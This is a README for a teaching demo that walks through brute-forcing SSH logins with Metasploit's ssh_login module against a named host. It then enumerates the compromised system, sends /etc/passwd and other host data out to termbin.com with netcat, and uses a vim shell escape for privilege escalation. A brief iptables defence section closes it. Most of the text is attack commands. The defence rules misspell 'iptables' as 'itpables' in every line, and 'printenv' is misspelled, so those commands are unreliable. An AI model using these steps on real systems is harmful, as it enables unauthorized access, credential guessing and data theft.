# Bruteforcing-SSH
========

This is a demo which will exploit SSH on a linux host. Once SSH access is gained, privilege escalation is used to become root. *Note* this README and demo is still under developement.


Downloading Dictionary Files
------------

Clone the project on your local system:

    git clone https://github.com/sillihkram/Bruteforcing-SSH.git
    cd Bruteforcing-SSH/

unpack and prepare the list of commonly used users & passwords
    
    gunzip passwords.txt.gz
    cp passwords.txt /tmp/passwords.txt 
    cp users.txt /tmp/users.txt

Just so you are familiar, take at the content and format of the files 
    
    wc -l /tmp/passwords.txt # Notice this is a long list
    head /tmp/passwords.txt
    head /tmp/users.txt
    

# Installing Metasploit (RHEL, Fedora, CentOS)
------------

Download the latest version of Metasploit Framework (OSS)

    curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall

Set Permissions 

    chmod 755 msfinstall

 Run the install script

    ./msfinstall

By default metasploit framework installs it's self to `/opt/` let's take a look and add that to our path
    
    ls /opt/
    echo $PATH

Add the `/opt/metasploit-framework/bin/` directory to our path


    PATH=/opt/metasploit-framework/bin/:$PATH
    # you may want to make this persistant add this line to your .bash_profile


Add Metasploit repo to our system and make sure we have the latest version.

    msfupdate

# Installing Metasploit (Mac)
------------

    brew install metasploit
     

# Using Metasploit
------------

Launch the metasploit framework console

 
    msfconsole


List the available exploit modules for metasploit


    show exploits

Because there are over 2000 modules it may make more sense to search for one we're looking for
 
    search ssh login

For this demo select the auxiliary/scanner/ssh/ssh_login exploit module

    use auxiliary/scanner/ssh/ssh_login


List the options available for this module

    options

Define options for ssh_login module to launch a brute force attack against a target host

    set stop_on_success true
    set pass_file /tmp/passwords.txt
    set user_file /tmp/users.txt
    set threads 10


Define a target
    
    set rhost graffias.openincite.net

Launch the brute force attack

    exploit

if Metasploit successfully authenitcates with a usr/pass provided in the lists you'll see a message similar to the following:

`[+] 192.168.0.136:22 - Success: 'podman:password'`


Not only did metasploit find a combination that successfully authenticates but it also left a session open. List the open sessions

    sessions

To interact with the open session use the sessions command: `sessions -i <session id>`

    sessions -i 1

Now you are connected to a shell on the target. try typing some basic shell commands

    hostname -f
    uname -a

# Enumerating a Host
------------

connect to the target using the discovered credentials

    ssh graffias.openincite.net -l podman
    id
    sudo -l -U podman
    
podman appears to be a non privalaged user. Let's see what we can find out about the system...

    ls -lah $PWD
    firewall-cmd --list-ports >> $HOSTNAME.txt
    prinenv >> $HOSTNAME.txt
    cat /etc/passwd >> $HOSTNAME.txt
    yum list installed >> $HOSTNAME.txt
    
Let's grab a copy of the information we've collected 

    cat $HOSTNAME.txt | nc termbin.com 9999
    
# privilage escalation 
------------
Use vim to hide our shell

    vim 
    : ! /bin/bash -p
    
    
# Protecting a host from bruteforce
------------

Ensure iptables is installed:

    sudo yum install iptables -y

Add a simple rule to iptables to drop brute force attackes after an excessive amount of attempts

    itpables -P INPUT ACCEPT
    itpables -P FORWARD ACCEPT
    itpables -P OUTPUT ACCEPT
    itpables -N SSHBFATK
    itpables -A INPUT -p tcp -m tcp --dport 22 -m state --state NEW -m recent --set --name SSH --mask 255.255.255.255 --rsource
    itpables -A INPUT -p tcp -m tcp --dport 22 -m state --state NEW -m recent --update --seconds 600 --hitcount 50 --name SSH --mask 255.255.255.255 --rsource -j SSHBFATK
    itpables -A SSHBFATK -m limit --limit 5/min -j LOG --log-prefix "SSH: Detect brute force atk! " --log-level 6
    itpables -A SSHBFATK -j DROP

Now run the brute force exploit again and observe the behavior

    exploit

